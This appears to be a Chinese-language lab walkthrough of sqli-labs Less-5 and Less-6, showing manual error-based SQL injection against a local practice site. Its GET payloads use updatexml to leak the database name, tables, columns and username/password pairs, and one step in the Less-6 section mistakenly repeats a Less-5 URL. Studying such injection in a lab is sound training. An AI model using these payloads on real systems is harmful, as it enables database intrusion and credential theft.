# 原创
：  （手工）【sqli-labs5-6】GET方法、单双引号、报错注入：基本步骤、错误注入过程

# （手工）【sqli-labs5-6】GET方法、单双引号、报错注入：基本步骤、错误注入过程

**目录**

[一、错误注入（手工）SQL注入基本步骤：](#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less5（GET-Double injection-Single Quotes -String）](#Less5%EF%BC%88GET-Double%20injection-Single%20Quotes%20-String%EF%BC%89)

[2.1、简介：（单引号+报错注入）](#%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E5%8D%95%E5%BC%95%E5%8F%B7%2B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[2.3、第二步：查询字段数](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E6%95%B0)

[2.4、第三步：查看数据库基本信息](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF)

[2.5、第四步：爆数据库](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93)

[2.6、第五步：爆数据库表](#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8)

[2.7、第六步：爆字段](#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[2.8、第七步：爆数据](#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[三、Less6（GET-Double injection-Double Quotes -String）](#%E4%B8%89%E3%80%81Less6%EF%BC%88GET-Double%20injection-Double%20Quotes%20-String%EF%BC%89)

[ 3.1、简介：（双引号+报错注入）](#%C2%A03.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E5%8F%8C%E5%BC%95%E5%8F%B7%2B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[3.2、第一步：注入点测试](#%C2%A03.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[3.3、第二步：查询字段数](#3.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E6%95%B0)

[3.4、第三步：查看数据库基本信息](#3.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF)

[3.5、第四步：爆数据库](#3.5%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93)

[3.6、第五步：爆数据库表](#3.6%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8)

[3.7、第六步：爆字段](#3.7%E3%80%81%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[3.8、第七步：爆数据](#%C2%A03.8%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

---


## 一、错误注入（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：查询字段数
第三步：查询数据库的基本信息
第四步：爆数据库名
第五步：爆数据库表
第六步：爆字段
第七步：爆数据


---


---


## 二、Less5（GET-Double injection-Single Quotes -String）

> 
<h3>2.1、简介：（单引号+报错注入）</h3>
请求方法：GET
方法：错误回显


> 
<h3>2.2、第一步：注入点测试</h3>
测试id=1，没有显示数据 
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1

将数据扩大到1000了，仍没有显示位
所以不能使用联合查询
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1000


 加上单引号后，发现会返回报错信息，且可以知道是单引号闭合的
可以考虑使用报错注入




> 
<h3>2.3、第二步：查询字段数</h3>
输入为2时，报错字段数不符
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1' and 1=0 union select 1,2--+

 当为3的时候，就没有报错，字段数正确
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1' and 1=0 union select 1,2,3--+




> 
<h3>2.4、第三步：查看数据库基本信息</h3>
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+




> 
<h3>2.5、第四步：爆数据库</h3>
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

注：
在ASCII码表中，0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错




> 
<h3>2.6、第五步：爆数据库表</h3>
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+




> 
<h3>2.7、第六步：爆字段</h3>
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1) --+<br/>  




> 
<h3>2.8、第七步：爆数据</h3>
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+


http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),31,32),0x7e),1)--+


将31,32继续往后移，就可以获得，更多的数据


---


---


## 三、Less6（GET-Double injection-Double Quotes -String）

> 
<h3> 3.1、简介：（双引号+报错注入）</h3>
请求方法：GET
方法：错误回显


> 
<h3>3.2、第一步：注入点测试</h3>
测试id=1，没有显示数据 
http://localhost:8080/sqli-labs-master/Less-6/<br/> ?id=1 


将数据扩大到1000了，仍没有显示位
所以不能使用联合查询
http://localhost:8080/sqli-labs-master/Less-6/<br/> ?id=1000


 加上单引号后，没有报错，说明不是单引号闭合
加上双引号后，发现会返回报错信息，且可以知道是双引号闭合的
可以考虑使用报错注入





> 
<h3>3.3、第二步：查询字段数</h3>
输入为2时，报错字段数不符
http://localhost:8080/sqli-labs-master/Less-6/<br/> ?id=1" and 1=0 union select 1,2--+


 当为3的时候，就没有报错，字段数正确
http://localhost:8080/sqli-labs-master/Less-5/<br/> ?id=1' and 1=0 union select 1,2,3--+





> 
<h3>3.4、第三步：查看数据库基本信息</h3>
http://localhost:8080/sqli-labs-master/Less-6/<br/> ?id=1" and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+





> 
<h3>3.5、第四步：爆数据库</h3>
http://localhost:8080/sqli-labs-master/Less-6/<br/> ?id=1" and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

注：
在ASCII码表中，0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错





> 
<h3>3.6、第五步：爆数据库表</h3>
http://localhost:8080/sqli-labs-master/Less-6/<br/> ?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) --+





> 
<h3>3.7、第六步：爆字段</h3>
http://localhost:8080/sqli-labs-master/Less-6/<br/> ?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1)--+





> 
<h3>3.8、第七步：爆数据</h3>
http://localhost:8080/sqli-labs-master/Less-6/<br/> ?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+



http://localhost:8080/sqli-labs-master/Less-6/<br/> ?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),31,32),0x7e),1)--+



将31,32继续往后移，就可以获得，更多的数据

